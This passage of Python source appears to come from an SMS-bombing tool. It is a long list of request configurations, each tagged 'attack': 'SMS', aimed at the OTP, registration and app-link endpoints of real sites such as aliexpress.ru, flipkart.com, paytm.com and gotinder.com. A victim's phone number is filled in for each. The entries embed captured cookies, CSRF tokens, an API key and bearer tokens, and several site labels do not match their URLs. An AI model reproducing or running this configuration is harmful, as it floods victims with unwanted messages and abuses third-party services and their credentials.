                'cookie': 'uid=UbGokWNsHtsam06bAwXMAg==; .ASPXANONYMOUS=aLtF3Euak0aI0S9e42PDHw; _SL_=6.83.; _ipl=6.83.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_CREDITSELECTION=Test_000195_A; AB_CREDITSELECTION_DIRECT=never; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8GIymPxtm1FFmKVQVGA7i3eSw5EuDlEAI6yoUR-lLFuhs6PZSKZSYC69yd-ImQtg7VMTVs-YREVxcAm9pTBRdll6qirhjMSoXp20s8hxsTbAL6O3BZFBlhYZ_8Nf00Qvpcpt1dmrE5oyGos4nyJcoes; __cf_bm=ZjbtEUV9dl1mEJNlE4WHlqfswV2gFvh28__bRnhiZbc-1668030211-0-AUO7xru8loJtNzO2Ffv6rNJrjJnYGpb5KYOMSIokmdlEk8VF/XY1xx/aKWrJWuHqh1Bqhq8nPhFdWeylZhzgjy1pKA+V7XExgqMhepF+s63F; _cfuvid=VvENPoiZRWhMICqFKfY413RVyf_TwT4WmJFCPZPVJiM-1668030211698-0-604800000',
                'origin': 'https://my.sravni.ru',
                'referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fuser%2Fprofile',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1]
            },
            'data': {
                '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
                'phone': number,
                'returnUrl': '/user/profile'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'my.sravni.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://my.sravni.ru/signin/code',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '17',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'region=1; deliveryTypeId=1; standardShopId=2527; luuid=73c0fa54-2927-4afa-a372-6004f8647bb6; suuid=d739609b-436f-4502-a032-67dba9fdc97e; XSRF-TOKEN=eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZDczYzBmYTU0LTI5MjctNGFmYS1hMzcyLTYwMDRmODY0N2JiNjBmZDJlNzVkMjNlMDQ5MWQ4MGRkMTgzOGU0NmY1YWYwODliMTJhYWMiLCJpYXQiOjE2NjgwMzA1OTguMjU0ODMyLCJuYmYiOjE2NjgwMzA1OTguMjU0ODM0LCJleHAiOjE2NjgxMTY5OTguMjUxNTQsInN1YiI6IiIsInNjb3BlcyI6W10sInNwbGl0X3NlZ21lbnQiOjl9.B-C8hM2_ZfrY4QdYvmqbZQFgfUbcrOYb40F_5rpzUuS086BFGi1WelZVdavOhFeUKR7o8AT9rLKIQ7SvO_i4WwB1gJ7NCPwqNq8saUHSMIqoZruJiNPOTa_fyYAJGXaOLekVK984_84tohSyVPp6CgM1HtXD8lvKSD1tnDhtP7SjFaazKnD4YwkHeT0mJsi4smjX-XsMJN9Z3A2y5-0GT6HEol93jKlXNw3wsBR_7ZJ_vpIT9waE9w-tIs21HvCW6Ad6j5Okn0lO2MtYZ5KuP63UBFj3BERVx7GJTIRKbjFMzS6tb0jw1pQkMX_k86d181wsPZagCOW9cxSMpcxP1O8rDP_MVLk-Y53c3Ap3R-3EhdWYyex74Pua6ZOBerNu_Eg6wM2KcTQQOyOY3jdtQ5BUg7orMtkmxA5ua6NGlaJeNmDqbQDwsZSMF7kbpzI5YRjg8lSy6rUHUJQCHDKCSHaVCVnO65IjNru1qZ5B0AgWeNE85vf5EgDx5IvviHzVCz4QAkztlhqpebCZ4rM992-As26eSZZN_gYY1e38xehoXFwS1tDhWr5jWQMbgOlAfSj649353BXO-iPQ10_NS81g-1579ZxF6f9HtmuGe7gm_5WtNkEpH2SSDaVasXNo45Gh23DMWGLw1JA64LfU3RNlHMdoRDPfVfgRNzzG5rs; split_segment_amount=11; aid=eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D',
                'origin': 'https://www.vprok.ru',
                'referer': 'https://www.vprok.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.vprok.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.vprok.ru/as_send_pin',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ua': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
                'bx-umidtoken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                'content-length': '1561',
                'content-type': 'text/plain;charset=UTF-8',
                'cookie': 'aer_abid=e7837ca8509e6c9a; acs_usuc_t=x_csrf=3gi48phl5j_s&acs_rt=7122813d0f5b49338fcecc4affd772da; xman_t=RYU45Rw/P4JNJF84NKgT4dq70sIp4TguFPGJj8BZOhkRd0TBje5c2RaODRkrwPhT; xman_f=5un0UFmYvrNgACLBAum4oWM8RAUqunUYiCgw4FGrjNzKARmwUxko2lpQqldFKK5Of1fWk0gHOItRELxCz/Cp/nIE6bPX4/Fo3fBI1z596wNChx5//UL6WQ==; xman_us_f=x_locale=ru_RU&x_l=0&x_c_chg=1&acs_rt=50c77cefad7a4021b41f0f6f2a9ced49; intl_locale=ru_RU; aep_usuc_f=site=rus&c_tp=RUB&region=RU&b_locale=ru_RU; xlly_s=1; intl_common_forever=UYSq6AZOhhaI4ZOz9j5s1/mt5Mkg2bUOF+BzgAF3t937OTKSMIfdaw==; JSESSIONID=44828D31960F5FA579B40154BB4ABEEC; tfstk=cl3CB9geNY3ayZYl-JOwU_f7xbahZx5bNHwnOptNgV0hxclCiSb4hNIrqTUzw51..; l=eBM9vtwITHaZfir8BO5ahurza77TmCOfcsPzaNbMiInca6nOaFiMWNCUvWrpudtjQt5jeEtyLtAZndny8SU3Wtw7VXuPMUGlifppRe1..; isg=BCUlHVXRqkixJ84UtWrpsDHoNOdfYtn0gFsUSCcP6txrPk2w47MwxZUYyLpIPvGs',
                'origin': 'https://aliexpress.ru',
                'referer': 'https://aliexpress.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-aer-cna': '-'
            },
            'data': {
                '{"phone': number,
                'returnURL': 'https://aliexpress.ru/", "channel": "CALL", "environment": {',
                'uaEncrpt': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
                'umidToken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                'regSrc': 'AE_MAIN_LOGIN", "securityTimestamp": 1668031201204',
                'refer': 'https://aliexpress.ru/',
                'userAgent': user_agent()[1]
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'aliexpress.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.0.52',
            'headers': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '407',
                'Content-Type': 'text/plain;charset=UTF-8',
                'Host': 'clientsapi03w.bk6bba-resources.com',
                'Origin': 'https://www.fon.bet',
                'Referer': 'https://www.fon.bet/account/registration/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'advertInfo': '',
                'birthday': '2000-10-25',
                'deviceId': '2340BBFFD39BD54C3A914A90D5582A63',
                'ecupis': 'True',
                'email': email(),
                'emailAdvertAccepted': email(),
                'fio': '',
                'lang': 'ru',
                'password': 'Hoho_HO123',
                'phoneNumber': number,
                'platformInfo': 'user',
                'promoId': '',
                'sysId': '1',
                'webReferrer': 'https://www.fon.bet/'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'clientsapi03w.bk6bba-resources.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '29',
                'content-type': 'application/json',
                'origin': 'https://www.myacuvue.acuvue.ru',
                'referer': 'https://www.myacuvue.acuvue.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent()[1],
                'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
                'x-app-version': 'PWA 2.3.1'
            },
            'data': {
                'phoneNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'api.myacuvuepro.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.myacuvuepro.ru/myacuvue/oauth/mobile',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '29',
                'content-type': 'application/json',
                'Origin': 'https://smartseeds.ru',
                'Referer': 'https://smartseeds.ru/account/registration',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent()[1],
                'Authorization': 'Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw'
            },
            'data': {
                'profileDetails': '{',
                'individualTaxpayerNumber': number,
                'farmer': 'False',
                'vatPayer': 'False',
                'exportBasis': 'False',
                'contactFullName': 'Бла бла бла',
                'email': email(),
                'password': 'testpassword1234',
                'verificationCode': 'None',
                'phoneNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'smartseeds.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://smartseeds.ru/api/native/v1.0/cargo-owner/validate',
            'headers': {

            },
            'data': {
                  "profileDetails": {
                    "individualTaxpayerNumber": "6163027810",
                    "farmer": False,
                    "vatPayer": False,
                    "exportBasis": False
                  },
                  "contactFullName": "Бла бла бла",
                  "email": "testmail@fi.ru",
                  "password": "testpassword1234",
                  "verificationCode": None,
                  "phoneNumber": number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://member.daraz.com.np/user/api/sendVerificationSms',
            'headers': {
                'X-CSRF-TOKEN': '57343b8557abe',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://member.daraz.com.np',
                'Referer': 'https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG',
                'Cookie': 'client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33'
            },
            'data': {
                'phone': number,
                'type': 'OTP_REGISTER',
                'lzdAppVersion': '1.0',
                'X-CSRF-TOKEN': '57343b8557abe',
                'ncToken': {
                    'csessionid': '01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc',
                    'sig': '05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du',
                    'token': 'QPXW:1638536554908:0.22529358478093664'
                }
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://securedapi.confirmtkt.com/api/platform/register',
            'headers': {

            },
            'data': {
                'newOtp': 'true',
                'mobileNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php',
            'headers': {

            },
            'data': {
                'mobile': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.frotels.com/appsendsms.php',
            'headers': {

            },
            'data': {
                'mobno': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.gapoon.com/userSignup',
            'headers': {

            },
            'data': {
                'mobile': number,
                'email': 'email()',
                'name': 'LexLuthor'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://login.housing.com/api/v2/send-otp',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://porter.in/restservice/send_app_link_sms',
            'headers': {

            },
            'data': {
                'phone': number,
                'referrer_string': '',
                'brand': 'porter'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://cityflo.com/website-app-download-link-sms/',
            'headers': {

            },
            'data': {
                'mobile_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.nnnow.com/d/api/appDownloadLink',
            'headers': {

            },
            'data': {
                'mobileNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://login.web.ajio.com/api/auth/signupSendOTP',
            'headers': {

            },
            'data': {
                'firstName': 'xxps',
                'login': 'wiqpdl223@wqew.com',
                'password': 'QASpw@1s',
                'genderType': 'Male',
                'mobileNumber': number,
                'requestType': 'SENDOTP'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://unacademy.com/api/v1/user/get_app_link/',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.treebo.com/api/v2/auth/login/otp/',
            'headers': {

            },
            'data': {
                'phone_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.airtel.in/referral-api/core/notify',
            'headers': {

            },
            'data': {
                'messageId': 'map',
                'rtn': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://pharmeasy.in/api/auth/requestOTP',
            'headers': {

            },
            'data': {

            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.mylescars.com/usermanagements/chkContact',
            'headers': {

            },
            'data': {
                'contactNo': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://grofers.com/v2/accounts/',
            'headers': {
                'auth_key': '3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7'
            },
            'data': {
                'user_phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.dream11.com/sendsmslink',
            'headers': {

            },
            'data': {
                'siteId': '1',
                'mobileNum': number,
                'appType': 'androidfull'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.cashify.in/api/cu01/v1/app-link',
            'headers': {

            },
            'data': {
                'mn': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://commonfront.paytm.com/v4/api/sendsms',
            'headers': {

            },
            'data': {
                'phone': number,
                'guid': '2952fa812660c58dc160ca6c9894221d'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
            'headers': {
                'Referer': 'https://online.kfc.co.in/login',
                '__RequestVerificationToken': '-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01'
            },
            'data': {

            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
            'headers': {
                'Referer': 'https://indialends.com/personal-loan'
            },
            'data': {
                'aeyder03teaeare': '1',
                'ertysvfj74sje': '{cc}',
                'jfsdfu14hkgertd': number,
                'lj80gertdfg': '0'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
            'headers': {
                'X-user-agent': user_agent()[1],
                'Origin': 'https://www.flipkart.com',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': {
                'loginId': '+{number}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://cloud.mail.ru//api/v2/notify/applink',
            'headers': {

            },
            'data': {
                'phone': number,
                'api': '2',
                'email': 'email()',
                'x-email': 'email()'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.gotinder.com/v2/auth/sms/send',
            'headers': {

            },
            'data': {
                'phone_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://youla.ru/web-api/auth/request_code',
            'headers': {

            },
